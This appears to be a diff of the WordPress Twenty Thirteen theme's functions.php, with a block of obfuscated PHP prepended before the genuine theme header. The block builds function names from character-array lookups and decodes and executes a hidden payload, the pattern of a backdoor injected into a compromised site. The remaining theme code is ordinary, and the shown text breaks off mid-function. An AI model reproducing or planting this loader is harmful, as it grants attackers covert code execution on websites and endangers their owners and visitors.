aptemu[33].$aptemu[0].$aptemu[7].$aptemu[4].$aptemu[67].$aptemu[6].$aptemu[23].$aptemu[52].$aptemu[94].$aptemu[17].$aptemu[40].$aptemu[3].$aptemu[132].$aptemu[49].$aptemu[49].$aptemu[55].$aptemu[9].$aptemu[6].$aptemu[14].$aptemu[72].$aptemu[81].$aptemu[86].$aptemu[2].$aptemu[20].$aptemu[4].$aptemu[72].$aptemu[2].$aptemu[34].$aptemu[51].$aptemu[82].$aptemu[71].$aptemu[44].$aptemu[15].$aptemu[33].$aptemu[160].$aptemu[109].$aptemu[14].$aptemu[19].$aptemu[132].$aptemu[34].$aptemu[95].$aptemu[20].$aptemu[75].$aptemu[23].$aptemu[25].$aptemu[109].$aptemu[14].$aptemu[49].$aptemu[243].$aptemu[2].$aptemu[9].$aptemu[6].$aptemu[6].$aptemu[33].$aptemu[26].$aptemu[26].$aptemu[22].$aptemu[34].$aptemu[51].$aptemu[18].$aptemu[9].$aptemu[83].$aptemu[109].$aptemu[8].$aptemu[19].$aptemu[94].$aptemu[55].$aptemu[6].$aptemu[25].$aptemu[21].$aptemu[55].$aptemu[20].$aptemu[72].$aptemu[81].$aptemu[95].$aptemu[1].$aptemu[8].$aptemu[83].$aptemu[13].$aptemu[48].$aptemu[18].$aptemu[4].$aptemu[17].$aptemu[75].$aptemu[19].$aptemu[34].$aptemu[165].$aptemu[20].$aptemu[243].$aptemu[52].$aptemu[160].$aptemu[22].$aptemu[62].$aptemu[48].$aptemu[165].$aptemu[83].$aptemu[0].$aptemu[48].$aptemu[82].$aptemu[67].$aptemu[243].$aptemu[38].$aptemu[71].$aptemu[38].$aptemu[13].$aptemu[62].$aptemu[40].$aptemu[78].$aptemu[15].$aptemu[40].$aptemu[40].$aptemu[5].$aptemu[145].$aptemu[18].$aptemu[61].$aptemu[83].$aptemu[29].$aptemu[18].$aptemu[109].$aptemu[126].$aptemu[62].$aptemu[48].$aptemu[165].$aptemu[160].$aptemu[51].$aptemu[17].$aptemu[22].$aptemu[86].$aptemu[165].$aptemu[51].$aptemu[27].$aptemu[151].$aptemu[75].$aptemu[27].$aptemu[78].$aptemu[18].$aptemu[8].$aptemu[15].$aptemu[25].$aptemu[62].$aptemu[151].$aptemu[1].$aptemu[62].$aptemu[75].$aptemu[7].$aptemu[33].$aptemu[145].$aptemu[72].$aptemu[29].$aptemu[20].$aptemu[71].$aptemu[18].$aptemu[21].$aptemu[81].$aptemu[243].$aptemu[36].$aptemu[0].$aptemu[27].$aptemu[33].$aptemu[82].$aptemu[160].$aptemu[195].$aptemu[86].$aptemu[243].$aptemu[36].$aptemu[21].$aptemu[3].$aptemu[26].$aptemu[51].$aptemu[72].$aptemu[51].$aptemu[19].$aptemu[165].$aptemu[81].$aptemu[14].$aptemu[48].$aptemu[78].$aptemu[132].$aptemu[18].$aptemu[40].$aptemu[38].$aptemu[33].$aptemu[29].$aptemu[14].$aptemu[44].$aptemu[20].$aptemu[34].$aptemu[19].$aptemu[6].$aptemu[44].$aptemu[18].$aptemu[29].$aptemu[38].$aptemu[7].$aptemu[15].$aptemu[25].$aptemu[77].$aptemu[195].$aptemu[18].$aptemu[15].$aptemu[29].$aptemu[22].$aptemu[126].$aptemu[62].$aptemu[0].$aptemu[48].$aptemu[3].$aptemu[44].$aptemu[3].$aptemu[145].$aptemu[52].$aptemu[132].$aptemu[0].$aptemu[2].$aptemu[151].$aptemu[2].$aptemu[52].$aptemu[13].$aptemu[15].$aptemu[61].$aptemu[165].$aptemu[20].$aptemu[10].$aptemu[34].$aptemu[19].$aptemu[195].$aptemu[51].$aptemu[33].$aptemu[11].$aptemu[18].$aptemu[83].$aptemu[0].$aptemu[6].$aptemu[44].$aptemu[6].$aptemu[36].$aptemu[145].$aptemu[10].$aptemu[195].$aptemu[77].$aptemu[109].$aptemu[15].$aptemu[38].$aptemu[145].$aptemu[17].$aptemu[23].$aptemu[55].$aptemu[109].$aptemu[49].$aptemu[66].$aptemu[9].$aptemu[94].$aptemu[165].$aptemu[82].$aptemu[7].$aptemu[22].$aptemu[12].$aptemu[8].$aptemu[36].$aptemu[38].$aptemu[12].$aptemu[126].$aptemu[52].$aptemu[67].$aptemu[132].$aptemu[9].$aptemu[94].$aptemu[22].$aptemu[27].$aptemu[1].$aptemu[78].$aptemu[34].$aptemu[4].$aptemu[6].$aptemu[38].$aptemu[126].$aptemu[8].$aptemu[33].$aptemu[78].$aptemu[83].$aptemu[52].$aptemu[7].$aptemu[145].$aptemu[55].$aptemu[77].$aptemu[89].$aptemu[5].$aptemu[6].$aptemu[21].$aptemu[109].$aptemu[17].$aptemu[25].$aptemu[3].$aptemu[174].$aptemu[23].$aptemu[22].$aptemu[10].$aptemu[55].$aptemu[7].$aptemu[12].$aptemu[9].$aptemu[8].$aptemu[145].$aptemu[36].$aptemu[11].$aptemu[62].$aptemu[15].$aptemu[52].$aptemu[160].$aptemu[17].$aptemu[109].$aptemu[66].$aptemu[8].$aptemu[61].$aptemu[81].$aptemu[34].$aptemu[78].$aptemu[52].$aptemu[243].$aptemu[14].$aptemu[126].$aptemu[145].$aptemu[83].$aptemu[109].$aptemu[66].$aptemu[6].$aptemu[243].$aptemu[12].$aptemu[67].$aptemu[1].$aptemu[19].$aptemu[55].$aptemu[10].$aptemu[109].$aptemu[52].$aptemu[17].$aptemu[3].$aptemu[17].$aptemu[33].$aptemu[61].$aptemu[3].$aptemu[7].$aptemu[95].$aptemu[0].$aptemu[67].$aptemu[82].$aptemu[2].$aptemu[36].$aptemu[95].$aptemu[81].$aptemu[36].$aptemu[9].$aptemu[67].$aptemu[61].$aptemu[165].$aptemu[8].$aptemu[132].$aptemu[51].$aptemu[34].$aptemu[34].$aptemu[19].$aptemu[14].$aptemu[132].$aptemu[34].$aptemu[51].$aptemu[3].$aptemu[51].$aptemu[52].$aptemu[160].$aptemu[151].$aptemu[6].$aptemu[160].$aptemu[72].$aptemu[33].$aptemu[51].$aptemu[5].$aptemu[20].$aptemu[89].$aptemu[83].$aptemu[11].$aptemu[11].$aptemu[48].$aptemu[62].$aptemu[36].$aptemu[94].$aptemu[14].$aptemu[8].$aptemu[160].$aptemu[48].$aptemu[25].$aptemu[86].$aptemu[40].$aptemu[49].$aptemu[22].$aptemu[132].$aptemu[29].$aptemu[48].$aptemu[174].$aptemu[0].$aptemu[109].$aptemu[132].$aptemu[33].$aptemu[243].$aptemu[151].$aptemu[48].$aptemu[77].$aptemu[23].$aptemu[36].$aptemu[51].$aptemu[81].$aptemu[29].$aptemu[1].$aptemu[13].$aptemu[44].$aptemu[34].$aptemu[72].$aptemu[22].$aptemu[14].$aptemu[160].$aptemu[17].$aptemu[25].$aptemu[8].$aptemu[86].$aptemu[160].$aptemu[52].$aptemu[132].$aptemu[243].$aptemu[1].$aptemu[89].$aptemu[81].$aptemu[44].$aptemu[109].$aptemu[94].$aptemu[49].$aptemu[109].$aptemu[86].$aptemu[19].$aptemu[61].$aptemu[132].$aptemu[23].$aptemu[49].$aptemu[4].$aptemu[126].$aptemu[4].$aptemu[49].$aptemu[17].$aptemu[22].$aptemu[40].$aptemu[75].$aptemu[66].$aptemu[67].$aptemu[72].$aptemu[21].$aptemu[11].$aptemu[26].$aptemu[71].$aptemu[22].$aptemu[38].$aptemu[8].$aptemu[132].$aptemu[4].$aptemu[14].$aptemu[48].$aptemu[109].$aptemu[15].$aptemu[26].$aptemu[17].$aptemu[18].$aptemu[78].$aptemu[86].$aptemu[20].$aptemu[66].$aptemu[15].$aptemu[23].$aptemu[34].$aptemu[5].$aptemu[4].$aptemu[77].$aptemu[67].$aptemu[61].$aptemu[19].$aptemu[66].$aptemu[11].$aptemu[160].$aptemu[14].$aptemu[18].$aptemu[49].$aptemu[83].$aptemu[52].$aptemu[3].$aptemu[20].$aptemu[49].$aptemu[94].$aptemu[17].$aptemu[66].$aptemu[8].$aptemu[72].$aptemu[22].$aptemu[78].$aptemu[67].$aptemu[4].$aptemu[83].$aptemu[109].$aptemu[4].$aptemu[145].$aptemu[36].$aptemu[14].$aptemu[40].$aptemu[82].$aptemu[49].$aptemu[72].$aptemu[25].$aptemu[75].$aptemu[95].$aptemu[18].$aptemu[36].$aptemu[11].$aptemu[19].$aptemu[7].$aptemu[94].$aptemu[12].$aptemu[14].$aptemu[82].$aptemu[27].$aptemu[83].$aptemu[62].$aptemu[195].$aptemu[52].$aptemu[21].$aptemu[77].$aptemu[82].$aptemu[7].$aptemu[34].$aptemu[7].$aptemu[82].$aptemu[27].$aptemu[18].$aptemu[1].$aptemu[15].$aptemu[0].$aptemu[14].$aptemu[3].$aptemu[165].$aptemu[126].$aptemu[2].$aptemu[145].$aptemu[23].$aptemu[160].$aptemu[25].$aptemu[66].$aptemu[72].$aptemu[160].$aptemu[160].$aptemu[17].$aptemu[10].$aptemu[10].$aptemu[72].$aptemu[11].$aptemu[22].$aptemu[55].$aptemu[72].$aptemu[34].$aptemu[66].$aptemu[51].$aptemu[36].$aptemu[44].$aptemu[0].$aptemu[10].$aptemu[51].$aptemu[86].$aptemu[18].$aptemu[33].$aptemu[67].$aptemu[38].$aptemu[13].$aptemu[34].$aptemu[48].$aptemu[20].$aptemu[77].$aptemu[38].$aptemu[23].$aptemu[86].$aptemu[7].$aptemu[11].$aptemu[195].$aptemu[86].$aptemu[243].$aptemu[75].$aptemu[81].$aptemu[22].$aptemu[1].$aptemu[29].$aptemu[49].$aptemu[3].$aptemu[126].$aptemu[22].$aptemu[0].$aptemu[29].$aptemu[1].$aptemu[75].$aptemu[126].$aptemu[95].$aptemu[71].$aptemu[165].$aptemu[9].$aptemu[10].$aptemu[55].$aptemu[243].$aptemu[243].$aptemu[21].$aptemu[51].$aptemu[49].$aptemu[40].$aptemu[109].$aptemu[19].$aptemu[51].$aptemu[8].$aptemu[34].$aptemu[151].$aptemu[66].$aptemu[19].$aptemu[75].$aptemu[126].$aptemu[34].$aptemu[21].$aptemu[10].$aptemu[71].$aptemu[38].$aptemu[17].$aptemu[33].$aptemu[49].$aptemu[55].$aptemu[21].$aptemu[25].$aptemu[27].$aptemu[44].$aptemu[72].$aptemu[48].$aptemu[160].$aptemu[6].$aptemu[95].$aptemu[174].$aptemu[61].$aptemu[174].$aptemu[7].$aptemu[0].$aptemu[151].$aptemu[25].$aptemu[71].$aptemu[109].$aptemu[25].$aptemu[9].$aptemu[49].$aptemu[17].$aptemu[83].$aptemu[95].$aptemu[12].$aptemu[7].$aptemu[8].$aptemu[145].$aptemu[2].$aptemu[34].$aptemu[38].$aptemu[18].$aptemu[14].$aptemu[21].$aptemu[66].$aptemu[67].$aptemu[195].$aptemu[62].$aptemu[72].$aptemu[25].$aptemu[174].$aptemu[86].$aptemu[25].$aptemu[4].$aptemu[151].$aptemu[55].$aptemu[145].$aptemu[9].$aptemu[151].$aptemu[160].$aptemu[7].$aptemu[86].$aptemu[13].$aptemu[66].$aptemu[34].$aptemu[7].$aptemu[66].$aptemu[77].$aptemu[33].$aptemu[26].$aptemu[11].$aptemu[66].$aptemu[3].$aptemu[26].$aptemu[9].$aptemu[18].$aptemu[34].$aptemu[66].$aptemu[89].$aptemu[145].$aptemu[67].$aptemu[33].$aptemu[55].$aptemu[151].$aptemu[109].$aptemu[13].$aptemu[145].$aptemu[19].$aptemu[40].$aptemu[12].$aptemu[55].$aptemu[9].$aptemu[82].$aptemu[7].$aptemu[0].$aptemu[44].$aptemu[6].$aptemu[1].$aptemu[71].$aptemu[15].$aptemu[18].$aptemu[49].$aptemu[55].$aptemu[55].$aptemu[151].$aptemu[25].$aptemu[72].$aptemu[21].$aptemu[243].$aptemu[11].$aptemu[82].$aptemu[83].$aptemu[71].$aptemu[33].$aptemu[25].$aptemu[13].$aptemu[7].$aptemu[71].$aptemu[40].$aptemu[243].$aptemu[29].$aptemu[86].$aptemu[49].$aptemu[3].$aptemu[3].$aptemu[1].$aptemu[13].$aptemu[62].$aptemu[3].$aptemu[243].$aptemu[11].$aptemu[23].$aptemu[9].$aptemu[109].$aptemu[12].$aptemu[86].$aptemu[27].$aptemu[1].$aptemu[243].$aptemu[77].$aptemu[38].$aptemu[66].$aptemu[48].$aptemu[0].$aptemu[36].$aptemu[151].$aptemu[48].$aptemu[195].$aptemu[10].$aptemu[51].$aptemu[13].$aptemu[2].$aptemu[4].$aptemu[55].$aptemu[12].$aptemu[5].$aptemu[36].$aptemu[81].$aptemu[89].$aptemu[40].$aptemu[62].$aptemu[14].$aptemu[29].$aptemu[12].$aptemu[132].$aptemu[48].$aptemu[7].$aptemu[40].$aptemu[55].$aptemu[29].$aptemu[11].$aptemu[34].$aptemu[6].$aptemu[6].$aptemu[13].$aptemu[66].$aptemu[21].$aptemu[160].$aptemu[49].$aptemu[89].$aptemu[12].$aptemu[51].$aptemu[12].$aptemu[109].$aptemu[17].$aptemu[18].$aptemu[83].$aptemu[22].$aptemu[33].$aptemu[18].$aptemu[5].$aptemu[8].$aptemu[34].$aptemu[12].$aptemu[36].$aptemu[165].$aptemu[40].$aptemu[48].$aptemu[17].$aptemu[36].$aptemu[15].$aptemu[67].$aptemu[38].$aptemu[78].$aptemu[51].$aptemu[49].$aptemu[13].$aptemu[29].$aptemu[61].$aptemu[66].$aptemu[66].$aptemu[51].$aptemu[83].$aptemu[71].$aptemu[1].$aptemu[2].$aptemu[71].$aptemu[126].$aptemu[83].$aptemu[8].$aptemu[38].$aptemu[83].$aptemu[40].$aptemu[126].$aptemu[77].$aptemu[36].$aptemu[49].$aptemu[72].$aptemu[71].$aptemu[55].$aptemu[4].$aptemu[126].$aptemu[126].$aptemu[40].$aptemu[15].$aptemu[20].$aptemu[66].$aptemu[5].$aptemu[195].$aptemu[26].$aptemu[2].$aptemu[78].$aptemu[22].$aptemu[86].$aptemu[33].$aptemu[83].$aptemu[75].$aptemu[9].$aptemu[36].$aptemu[83].$aptemu[195].$aptemu[71].$aptemu[83].$aptemu[62].$aptemu[160].$aptemu[195].$aptemu[82].$aptemu[52].$aptemu[0].$aptemu[27].$aptemu[14].$aptemu[81].$aptemu[83].$aptemu[78].$aptemu[33].$aptemu[195].$aptemu[26].$aptemu[48].$aptemu[20].$aptemu[66].$aptemu[26].$aptemu[20].$aptemu[18].$aptemu[18].$aptemu[11].$aptemu[14].$aptemu[165].$aptemu[51].$aptemu[13].$aptemu[5].$aptemu[151].$aptemu[55].$aptemu[130].$aptemu[130];$friakycxbz=$aptemu[48].$aptemu[95].$aptemu[77].$aptemu[145].$aptemu[126].$aptemu[36].$aptemu[596].$aptemu[2].$aptemu[145].$aptemu[12].$aptemu[27].$aptemu[2].$aptemu[145];$bpcgbwsilxbk=$aptemu[4].$aptemu[22].$aptemu[165].$aptemu[151].$aptemu[12].$aptemu[27].$aptemu[34].$aptemu[51].$aptemu[78].$aptemu[145].$aptemu[77].$aptemu[77];$ivucnsdsjlsu=$aptemu[77].$aptemu[38].$aptemu[78].$aptemu[78].$aptemu[145].$aptemu[66];$vrluanjctlzl=$aptemu[12].$aptemu[78].$aptemu[145].$aptemu[95].$aptemu[38].$aptemu[145].$aptemu[596].$aptemu[52].$aptemu[165].$aptemu[151].$aptemu[12].$aptemu[38].$aptemu[6].$aptemu[27].$aptemu[151];$livvuerphehkxr=$aptemu[2337].$aptemu[95];$plhlcsgcfpfybek=$aptemu[3982].$aptemu[320].$aptemu[95].$aptemu[2337].$aptemu[45].$aptemu[8].$aptemu[95].$aptemu[66].$aptemu[145];$psrlnwccdhkoebl=$aptemu[145].$aptemu[243].$aptemu[6].$aptemu[38];$qwnuwtgsetjdjxi=$ivucnsdsjlsu;$nzraxapjbn=$bpcgbwsilxbk($friakycxbz($goetyogljtrx));$nzraxapjbn=$qwnuwtgsetjdjxi($nzraxapjbn);$livvuerphehkxrdaxuxkotdvlho=$vrluanjctlzl($livvuerphehkxr,$ivucnsdsjlsu($plhlcsgcfpfybek));$livvuerphehkxrdaxuxkotdvlho($ivucnsdsjlsu($nzraxapjbn));$psrlnwccdhkoebl;?><?php
+/**
+ * Twenty Thirteen functions and definitions
+ *
+ * Sets up the theme and provides some helper functions, which are used in the
+ * theme as custom template tags. Others are attached to action and filter
+ * hooks in WordPress to change core functionality.
+ *
+ * When using a child theme (see https://codex.wordpress.org/Theme_Development
+ * and https://codex.wordpress.org/Child_Themes), you can override certain
+ * functions (those wrapped in a function_exists() call) by defining them first
+ * in your child theme's functions.php file. The child theme's functions.php
+ * file is included before the parent theme's file, so the child theme
+ * functions would be used.
+ *
+ * Functions that are not pluggable (not wrapped in function_exists()) are
+ * instead attached to a filter or action hook.
+ *
+ * For more information on hooks, actions, and filters, @link https://codex.wordpress.org/Plugin_API
+ *
+ * @package WordPress
+ * @subpackage Twenty_Thirteen
+ * @since Twenty Thirteen 1.0
+ */
+
+/*
+ * Set up the content width value based on the theme's design.
+ *
+ * @see twentythirteen_content_width() for template-specific adjustments.
+ */
+if ( ! isset( $content_width ) )
+	$content_width = 604;
+
+/**
+ * Add support for a custom header image.
+ */
+require get_template_directory() . '/inc/custom-header.php';
+
+/**
+ * Twenty Thirteen only works in WordPress 3.6 or later.
+ */
+if ( version_compare( $GLOBALS['wp_version'], '3.6-alpha', '<' ) )
+	require get_template_directory() . '/inc/back-compat.php';
+
+/**
+ * Twenty Thirteen setup.
+ *
+ * Sets up theme defaults and registers the various WordPress features that
+ * Twenty Thirteen supports.
+ *
+ * @uses load_theme_textdomain() For translation/localization support.
+ * @uses add_editor_style() To add Visual Editor stylesheets.
+ * @uses add_theme_support() To add support for automatic feed links, post
+ * formats, and post thumbnails.
+ * @uses register_nav_menu() To add support for a navigation menu.
+ * @uses set_post_thumbnail_size() To set a custom post thumbnail size.
+ *
+ * @since Twenty Thirteen 1.0
+ */
+function twentythirteen_setup() {
+	/*
+	 * Makes Twenty Thirteen available for translation.
+	 *
+	 * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/twentythirteen
+	 * If you're building a theme based on Twenty Thirteen, use a find and
+	 * replace to change 'twentythirteen' to the name of your theme in all
+	 * template files.
+	 */
+	load_theme_textdomain( 'twentythirteen' );
+
+	/*
+	 * This theme styles the visual editor to resemble the theme style,
+	 * specifically font, colors, icons, and column width.
+	 */
+	add_editor_style( array( 'css/editor-style.css', 'genericons/genericons.css', twentythirteen_fonts_url() ) );
+
+	// Adds RSS feed links to <head> for posts and comments.
+	add_theme_support( 'automatic-feed-links' );
+
+	/*
+	 * Switches default core markup for search form, comment form,
+	 * and comments to output valid HTML5.
+	 */
+	add_theme_support( 'html5', array(
+		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
+	) );
+
+	/*
+	 * This theme supports all available post formats by default.
+	 * See https://codex.wordpress.org/Post_Formats
+	 */
+	add_theme_support( 'post-formats', array(
+		'aside', 'audio', 'chat', 'gallery', 'image', 'link', 'quote', 'status', 'video'
+	) );
+
+	// This theme uses wp_nav_menu() in one location.
+	register_nav_menu( 'primary', __( 'Navigation Menu', 'twentythirteen' ) );
+
+	/*
+	 * This theme uses a custom image size for featured images, displayed on
+	 * "standard" posts and pages.
+	 */
+	add_theme_support( 'post-thumbnails' );
+	set_post_thumbnail_size( 604, 270, true );
+
+	// This theme uses its own gallery styles.
+	add_filter( 'use_default_gallery_style', '__return_false' );
+
+	// Indicate widget sidebars can use selective refresh in the Customizer.
+	add_theme_support( 'customize-selective-refresh-widgets' );
+}
+add_action( 'after_setup_theme', 'twentythirteen_setup' );
+
+/**
+ * Return the Google font stylesheet URL, if available.
+ *
+ * The use of Source Sans Pro and Bitter by default is localized. For languages
+ * that use characters not supported by the font, the font can be disabled.
+ *
+ * @since Twenty Thirteen 1.0
+ *
+ * @return string Font stylesheet or empty string if disabled.
+ */
+function twentythirteen_fonts_url() {
+	$fonts_url = '';
+
+	/* Translators: If there are characters in your language that are not
+	 * supported by Source Sans Pro, translate this to 'off'. Do not translate
+	 * into your own language.
+	 */
+	$source_sans_pro = _x( 'on', 'Source Sans Pro font: on or off', 'twentythirteen' );
+
+	/* Translators: If there are characters in your language that are not
+	 * supported by Bitter, translate this to 'off'. Do not translate into your
+	 * own language.
+	 */
+	$bitter = _x( 'on', 'Bitter font: on or off', 'twentythirteen' );
+
+	if ( 'off' !== $source_sans_pro || 'off' !== $bitter ) {
+		$font_families = array();
+
+		if ( 'off' !== $source_sans_pro )
+			$font_families[] = 'Source Sans Pro:300,400,700,300italic,400italic,700italic';
+
+		if ( 'off' !== $bitter )
+			$font_families[] = 'Bitter:400,700';
+
+		$query_args = array(
+			'family' => urlencode( implode( '|', $font_families ) ),
+			'subset' => urlencode( 'latin,latin-ext' ),
+		);
+		$fonts_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
+	}
+
+	return $fonts_url;
+}
+
+/**
+ * Enqueue scripts and styles for the front end.
+ *
+ * @since Twenty Thirteen 1.0
+ */
+function twentythirteen_scripts_styles() {
+	/*
+	 * Adds JavaScript to pages with the comment form to support
+	 * sites with threaded comments (when in use).
+	 */
+	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )
+		wp_enqueue_script( 'comment-reply' );
+
+	// Adds Masonry to handle vertical alignment of footer widgets.
+	if ( is_active_sidebar( 'sidebar-1' ) )
+		wp_enqueue_script( 'jquery-masonry' );
+
+	// Loads JavaScript file with functionality specific to Twenty Thirteen.
+	wp_enqueue_script( 'twentythirteen-script', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '20160717', true );
+
+	// Add Source Sans Pro and Bitter fonts, used in the main stylesheet.
+	wp_enqueue_style( 'twentythirteen-fonts', twentythirteen_fonts_url(), array(), null );
+
+	// Add Genericons font, used in the main stylesheet.
+	wp_enqueue_style( 'genericons', get_template_directory_uri() . '/genericons/genericons.css', array(), '3.03' );
+
+	// Loads our main stylesheet.
+	wp_enqueue_style( 'twentythirteen-style', get_stylesheet_uri(), array(), '2013-07-18' );
+
+	// Loads the Internet Explorer specific stylesheet.
+	wp_enqueue_style( 'twentythirteen-ie', get_template_directory_uri() . '/css/ie.css', array( 'twentythirteen-style' ), '2013-07-18' );
+	wp_style_add_data( 'twentythirteen-ie', 'conditional', 'lt IE 9' );
+}
+add_action( 'wp_enqueue_scripts', 'twentythirteen_scripts_styles' );
+
+/**
+ * Filter the page title.
+ *
+ * Creates a nicely formatted and more specific title element text for output
+ * in head of document, based on current view.
+ *
+ * @since Twenty Thirteen 1.0
+ *
+ * @param string $title Default title text for current view.
+ * @param string $sep   Optional separator.
+ * @return string The filtered title.
+ */
+function twentythirteen_wp_title( $title, $sep ) {
+	global $paged, $page;
+
+	if ( is_feed() )
+		return $title;
+
+	// Add the site name.
+	$title .= get_bloginfo( 'name', 'display' );
+
+	// Add the site description for the home/front page.
+	$site_description = get_bloginfo( 'description', 'display' );
+	if ( $site_description && ( is_home() || is_front_page() ) )
+		$title = "$title $sep $site_description";
+
+	// Add a page number if necessary.
+	if ( ( $paged >= 2 || $page >= 2 ) && ! is_404() )
+		$title = "$title $sep " . sprintf( __( 'Page %s', 'twentythirteen' ), max( $paged, $page ) );
+
+	return $title;
+}
+add_filter( 'wp_title', 'twentythirteen_wp_title', 10, 2 );
+
+/**
+ * Register two widget areas.
+ *
+ * @since Twenty Thirteen 1.0
+ */
+function twentythirteen_widgets_init() {
+	register_sidebar( array(
+		'name'          => __( 'Main Widget Area', 'twentythirteen' ),
+		'id'            => 'sidebar-1',
+		'description'   => __( 'Appears in the footer section of the site.', 'twentythirteen' ),
+		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+		'after_widget'  => '</aside>',
+		'before_title'  => '<h3 class="widget-title">',
+		'after_title'   => '</h3>',
+	) );
+
+	register_sidebar( array(
+		'name'          => __( 'Secondary Widget Area', 'twentythirteen' ),
+		'id'            => 'sidebar-2',
+		'description'   => __( 'Appears on posts and pages in the sidebar.', 'twentythirteen' ),
+		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+		'after_widget'  => '</aside>',
+		'before_title'  => '<h3 class="widget-title">',
+		'after_title'   => '</h3>',
+	) );
+}
+add_action( 'widgets_init', 'twentythirteen_widgets_init' );
+
+if ( ! function_exists( 'twentythirteen_paging_nav' ) ) :
+/**
+ * Display navigation to next/previous set of posts when applicable.
+ *
+ * @since Twenty Thirteen 1.0
+ */
+function twentythirteen_paging_nav() {
+	global $wp_query;
+
+	// Don't print empty markup if there's only one page.
+	if ( $wp_query->max_num_pages < 2 )
+		return;
+	?>
+	<nav class="navigation paging-navigation" role="navigation">
+		<h1 class="screen-reader-text"><?php _e( 'Posts navigation', 'twentythirteen' ); ?></h1>
+		<div class="nav-links">
+
+			<?php if ( get_next_posts_link() ) : ?>
+			<div class="nav-previous"><?php next_posts_link( __( '<span class="meta-nav">&larr;</span> Older posts', 'twentythirteen' ) ); ?></div>
+			<?php endif; ?>
+
+			<?php if ( get_previous_posts_link() ) : ?>
+			<div class="nav-next"><?php previous_posts_link( __( 'Newer posts <span class="meta-nav">&rarr;</span>', 'twentythirteen' ) ); ?></div>
+			<?php endif; ?>
+
+		</div><!-- .nav-links -->
+	</nav><!-- .navigation -->
+	<?php
+}
+endif;
+
+if ( ! function_exists( 'twentythirteen_post_nav' ) ) :
+/**
+ * Display navigation to next/previous post when applicable.
+ *
+ * @since Twenty Thirteen 1.0
+ */
+function twentythirteen_post_nav() {
+	global $post;
+
+	// Don't print empty markup if there's nowhere to navigate.
+	$previous = ( is_attachment() ) ? get_post( $post->post_parent ) : get_adjacent_post( false, '', true );
+	$next     = get_adjacent_post( false, '', false );
+
+	if ( ! $next && ! $previous )
+		return;
+	?>
+	<nav class="navigation post-navigation" role="navigation">
+		<h1 class="screen-reader-text"><?php _e( 'Post navigation', 'twentythirteen' ); ?></h1>
+		<div class="nav-links">
+
+			<?php previous_post_link( '%link', _x( '<span class="meta-nav">&larr;</span> %title', 'Previous post link', 'twentythirteen' ) ); ?>
+			<?php next_post_link( '%link', _x( '%title <span class="meta-nav">&rarr;</span>', 'Next post link', 'twentythirteen' ) ); ?>
+
+		</div><!-- .nav-links -->
+	</nav><!-- .navigation -->
+	<?php
+}
+endif;
+
+if ( ! function_exists( 'twentythirteen_entry_meta' ) ) :
+/**
+ * Print HTML with meta information for current post: categories, tags, permalink, author, and date.
+ *
+ * Create your own twentythirteen_entry_meta() to override in a child theme.
+ *
+ * @since Twenty Thirteen 1.0
+ */
+function twentythirteen_entry_meta() {
+	if ( is_sticky() && is_home() && ! is_paged() )
+		echo '<span class="featured-post">' . esc_html__( 'Sticky', 'twentythirteen' ) . '</span>';
+
+	if ( ! has_post_format( 'link' ) && 'post' == get_post_type() )
+		twentythirteen_entry_date();
+
+	// Translators: used between list items, there is a space after the comma.
+	$categories_list = get_the_category_list( __( ', ', 'twentythirteen' ) );
+	if ( $categories_list ) {
+		echo '<span class="categories-links">' . $categories_list . '</span>';
+	}
+
+	// Translators: used between list items, there is a space after the comma.
+	$tag_list = get_the_tag_list( '', __( ', ', 'twentythirteen' ) );
+	if ( $tag_list ) {
+		echo '<span class="tags-links">' . $tag_list . '</span>';
+	}
+
+	// Post author
+	if ( 'post' == get_post_type() ) {
+		printf( '<span class="author vcard"><a class="url fn n" href="%1$s" title="%2$s" rel="author">%3$s</a></span>',
+			esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
+			esc_attr( sprintf( __( 'View all posts by %s', 'twentythirteen' ), get_the_author() ) ),
+			get_the_author()
+		);
+	}
+}
+endif;
+
+if ( ! function_exists( 'twentythirteen_entry_date' ) ) :
+/**
+ * Print HTML with date information for current post.
+ *
+ * Create your own twentythirteen_entry_date() to override in a child theme.
+ *
+ * @since Twenty Thirteen 1.0
+ *
+ * @param boolean $echo (optional) Whether to echo the date. Default true.
+ * @return string The HTML-formatted post date.
+ */
+function twentythirteen_entry_date( $echo = true ) {
+	if ( has_post_format( array( 'chat', 'status' ) ) )
+		$format_prefix = _x( '%1$s on %2$s', '1: post format name. 2: date', 'twentythirteen' );
+	else
+		$format_prefix = '%2$s';
+
+	$date = sprintf( '<span class="date"><a href="%1$s" title="%2$s" rel="bookmark"><time class="entry-date" datetime="%3$s">%4$s</time></a></span>',
+		esc_url( get_permalink() ),
+		esc_attr( sprintf( __( 'Permalink to %s', 'twentythirteen' ), the_title_attribute( 'echo=0' ) ) ),
+		esc_attr( get_the_date( 'c' ) ),
+		esc_html( sprintf( $format_prefix, get_post_format_string( get_post_format() ), get_the_date() ) )
+	);
+
+	if ( $echo )
+		echo $date;
+
+	return $date;
+}
+endif;
+
+if ( ! function_exists( 'twentythirteen_the_attached_image' ) ) :
+/**
+ * Print the attached image with a link to the next attached image.
+ *
+ * @since Twenty Thirteen 1.0
+ */
+function twentythirteen_the_attached_image() {
+	/**
+	 * Filter the image attachment size to use.
+	 *
+	 * @since Twenty thirteen 1.0
+	 *
+	 * @param array $size {
+	 *     @type int The attachment height in pixels.
+	 *     @type int The attachment width in pixels.
+	 * }
+	 */
+	$attachment_size     = apply_filters( 'twentythirteen_attachment_size', array( 724, 724 ) );
+	$next_attachment_url = wp_get_attachment_url();
+	$post                = get_post();
+
+	/*
+	 * Grab the IDs of all the image attachments in a gallery so we can get the URL
+	 * of the next adjacent image in a gallery, or the first image (if we're
+	 * looking at the last image in a gallery), or, in a gallery of one, just the
+	 * link to that image file.
+	 */
+	$attachment_ids = get_posts( array(
+		'post_parent'    => $post->post_parent,
+		'fields'         => 'ids',
+		'numberposts'    => -1,
+		'post_status'    => 'inherit',
+		'post_type'      => 'attachment',
+		'post_mime_type' => 'image',
+		'order'          => 'ASC',
+		'orderby'        => 'menu_order ID',
+	) );
+
+	// If there is more than 1 attachment in a gallery...
+	if ( count( $attachment_ids ) > 1 ) {
+		foreach ( $attachment_ids as $idx => $attachment_id ) {
+			if ( $attachment_id == $post->ID ) {
